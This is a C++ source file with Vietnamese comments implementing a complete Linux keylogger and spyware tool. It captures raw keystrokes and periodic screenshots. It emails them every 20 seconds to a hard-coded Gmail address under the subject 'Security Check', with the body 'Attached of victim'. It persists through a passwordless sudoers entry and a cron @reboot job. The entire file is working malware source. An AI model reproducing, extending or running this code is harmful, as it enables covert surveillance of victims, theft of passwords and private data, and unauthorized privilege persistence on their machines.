#include <ctime>
#include <thread>
#include <chrono>
#include <fstream>
#include <string>
#include <pthread.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <cstring>
// Cấu hình đường dẫn và thông tin email
#define SCREENSHOT_DIR "/tmp/screenshots"  // Thư mục lưu ảnh chụp màn hình
#define LOG_DIR "/tmp/key"                 // Thư mục lưu file log phím
#define FROM_EMAIL "ndluan1907@gmail.com"  // Email gửi
#define FROM_PASS ""    // App password Gmail
#define TO_EMAIL "unknownvodoi@gmail.com"  // Email nhận

// Bảng ánh xạ keycode sang ký tự
static const char* keycodes[] = {
    "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "<BACKSPACE>", "<TAB>", "q", "w", "e", "r", "t", "y",
    "u", "i", "o", "p", "[", "]", "<ENTER>", "<CTRL>", "a", "s",
    "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<LSHIFT>",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<RSHIFT>",
    "*", "<ALT>", " ", "<CAPSLOCK>"
};

// Thread chụp màn hình mỗi 10 giây
void* screen_capture(void*) {
    // Tạo thư mục lưu ảnh
    mkdir(SCREENSHOT_DIR, 0755);
    
    // Chờ 5s để hệ thống khởi động xong
    std::this_thread::sleep_for(std::chrono::seconds(5));
    
    std::string xauth_path;
    
    while (true) {
        // Tạo tên file theo thời gian: screenshot_20250110_143022.png
        time_t now = time(nullptr);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));
        std::string filepath = std::string(SCREENSHOT_DIR) + "/screenshot_" + timestamp + ".png";
        
        // Tìm file .Xauthority để có quyền truy cập X server (chỉ lần đầu)
        if (xauth_path.empty()) {
            FILE* fp = popen("find /home -name '.Xauthority' 2>/dev/null | head -1", "r");
            if (fp) {
                char buf[512];
                if (fgets(buf, sizeof(buf), fp)) {
                    xauth_path = buf;
                    xauth_path.erase(xauth_path.find_last_not_of("\n\r\t ") + 1);
                }
                pclose(fp);
            }
        }
        
        // Chụp màn hình bằng scrot với XAUTHORITY
        if (!xauth_path.empty()) {
            std::string cmd = "DISPLAY=:0 XAUTHORITY='" + xauth_path + "' scrot '" + filepath + "' 2>/dev/null";
            system(cmd.c_str());
        }
        
        // Chờ 10 giây trước khi chụp tiếp
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
    return nullptr;
}

// Tìm thiết bị bàn phím trong /proc/bus/input/devices
std::string find_keyboard_device() {
    std::ifstream file("/proc/bus/input/devices");
    if (!file.is_open()) return {};

    std::string line, event_id;
    bool is_keyboard = false;

    // Đọc file để tìm thiết bị có tên "Keyboard"
    while (std::getline(file, line)) {
        // Kiểm tra dòng Name= có chứa "Keyboard" không
        if (line.find("Name=") != std::string::npos && line.find("Keyboard") != std::string::npos) {
            is_keyboard = true;
        }
        
        // Nếu là keyboard, lấy số event (ví dụ: event3)
        if (is_keyboard && line.find("Handlers") != std::string::npos && line.find("kbd") != std::string::npos) {
            size_t pos = line.find("event");
            if (pos != std::string::npos) {
                event_id = line.substr(pos + 5, line.find_first_of(" \t\n", pos + 5) - pos - 5);
                break;
            }
        }
        
        // Dòng trống = thiết bị mới, reset flag
        if (line.empty()) is_keyboard = false;
    }
    
    // Trả về đường dẫn: /dev/input/eventX
    return event_id.empty() ? "" : "/dev/input/event" + event_id;
}

// Đính kèm tất cả file có extension cụ thể vào email
void attach_files_from_dir(curl_mime* mime, const std::string& dir_path, const std::string& ext) {
    DIR* dir = opendir(dir_path.c_str());
    if (!dir) return;

    struct dirent* ent;
    // Duyệt qua tất cả file trong thư mục
    while ((ent = readdir(dir)) != nullptr) {
        std::string filename(ent->d_name);
        
        // Chỉ lấy file có extension đúng (.log hoặc .png)
        if (filename.find(ext) != std::string::npos) {
            std::string filepath = dir_path + "/" + filename;
            
            // Tạo MIME part cho file đính kèm
            curl_mimepart* part = curl_mime_addpart(mime);
            curl_mime_filedata(part, filepath.c_str());          // Đường dẫn file
            curl_mime_filename(part, filename.c_str());          // Tên file hiển thị
            curl_mime_type(part, "application/octet-stream");    // Loại file
            curl_mime_encoder(part, "base64");                   // Mã hóa base64
        }
    }
    closedir(dir);
}

// Thread gửi email mỗi 20 giây với file đính kèm
void* email_sender(void*) {
    while (true) {
        // Chờ 20 giây trước khi gửi
        sleep(20);

        // Khởi tạo CURL
        CURL* curl = curl_easy_init();
        if (!curl) continue;

        // Tạo MIME message cho email có đính kèm
        curl_mime* mime = curl_mime_init(curl);
        
        // Thêm nội dung text
        curl_mimepart* part = curl_mime_addpart(mime);
        curl_mime_data(part, "Attached of victim", CURL_ZERO_TERMINATED);
        curl_mime_type(part, "text/plain");

        // Đính kèm tất cả file .log và .png
        attach_files_from_dir(mime, LOG_DIR, ".log");
        attach_files_from_dir(mime, SCREENSHOT_DIR, ".png");

        // Cấu hình SMTP Gmail
        curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
        curl_easy_setopt(curl, CURLOPT_USERNAME, FROM_EMAIL);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, FROM_PASS);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM_EMAIL);

        // Thiết lập người nhận
        curl_slist* recipients = curl_slist_append(nullptr, TO_EMAIL);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        // Thêm tiêu đề email
        curl_slist* headers = curl_slist_append(nullptr, "Subject: Security Check");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Gửi email
        curl_easy_perform(curl);

        // Giải phóng bộ nhớ
        curl_slist_free_all(recipients);
        curl_slist_free_all(headers);
        curl_mime_free(mime);
        curl_easy_cleanup(curl);
    }
    return nullptr;
}

// Cài đặt tự khởi động qua crontab
void install_crontab() {
    // Lấy đường dẫn file thực thi hiện tại
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) return;
    exe_path[len] = '\0';

    // Lấy username hiện tại (ưu tiên SUDO_USER nếu chạy với sudo)
    std::string username;
    char* sudo_user = getenv("SUDO_USER");
    if (sudo_user && strlen(sudo_user) > 0) {
        username = sudo_user;
    } else {
        FILE* fp = popen("whoami", "r");
        if (fp) {
            char buf[256];
            if (fgets(buf, sizeof(buf), fp)) {
                username = buf;
                username.erase(username.find_last_not_of("\n\r\t ") + 1);
            }
            pclose(fp);
        }
    }

    // Tạo file sudoers cho phép chạy không cần mật khẩu
    std::string sudoers_content = username + " ALL=(ALL) NOPASSWD: " + std::string(exe_path) + "\n";
    std::ofstream sudoers_file("/tmp/keylogger_sudo");
    sudoers_file << sudoers_content;
    sudoers_file.close();
    
    // Di chuyển vào /etc/sudoers.d/
    system("sudo mv /tmp/keylogger_sudo /etc/sudoers.d/keylogger_sudo 2>/dev/null");
    system("sudo chmod 440 /etc/sudoers.d/keylogger_sudo 2>/dev/null");

    // Tạo entry crontab: @reboot = chạy khi khởi động
    std::string cron_entry = "@reboot sudo " + std::string(exe_path) + " >/dev/null 2>&1\n";
    
    // Lấy crontab hiện tại ra file tạm
    system("crontab -l > /tmp/current_cron 2>/dev/null");
    
    // Kiểm tra xem entry đã tồn tại chưa
    std::ifstream check("/tmp/current_cron");
    std::string line;
    bool exists = false;
    while (std::getline(check, line)) {
        if (line.find(exe_path) != std::string::npos) {
            exists = true;
            break;
        }
    }
    check.close();
    
    // Nếu chưa có thì thêm vào
    if (!exists) {
        std::ofstream cron_file("/tmp/current_cron", std::ios::app);
        cron_file << cron_entry;
        cron_file.close();
        
        // Cài đặt crontab mới
        system("crontab /tmp/current_cron 2>/dev/null");
    }
    
    // Xóa file tạm
    system("rm -f /tmp/current_cron");
}

int main() {
    // Cài đặt tự khởi động
    install_crontab();
    
    // Tạo thư mục lưu log
    mkdir(LOG_DIR, 0755);
    
    // Tạo 2 thread chạy nền (detach = tự quản lý, không cần join)
    pthread_t tid, sid;
    pthread_create(&tid, nullptr, screen_capture, nullptr);  // Thread chụp màn hình
    pthread_detach(tid);
    pthread_create(&sid, nullptr, email_sender, nullptr);    // Thread gửi email
    pthread_detach(sid);

    // Tìm thiết bị bàn phím
    std::string dev_path = find_keyboard_device();
    if (dev_path.empty()) return 1;

    // Mở thiết bị để đọc (cần quyền root)
    int fd = open(dev_path.c_str(), O_RDONLY);
    if (fd < 0) return 1;

    // Tạo file log theo thời gian: 10-10-2025_14:30.log
    time_t now = time(nullptr);
    char filepath[128];
    strftime(filepath, sizeof(filepath), LOG_DIR "/%d-%m-%Y_%H:%M.log", localtime(&now));

    // Mở file log để ghi (append mode)
    std::ofstream log(filepath, std::ios::app);
    if (!log.is_open()) {
        close(fd);
        return 1;
    }

    // Vòng lặp chính: đọc và ghi phím
    struct input_event ev{};
    while (true) {
        // Đọc sự kiện từ bàn phím
        if (read(fd, &ev, sizeof(ev)) == sizeof(ev) && 
            ev.type == EV_KEY &&    // Sự kiện phím
            ev.value == 1 &&        // Phím nhấn xuống (không phải nhả)
            ev.code < sizeof(keycodes) / sizeof(keycodes[0])) {  // Keycode hợp lệ
            
            // Lấy ký tự từ bảng keycodes
            const char* key = keycodes[ev.code];
            if (key && key[0]) {
                // Ghi vào file và flush ngay
                log << key;
                log.flush();
            }
        }
    }

    return 0;
}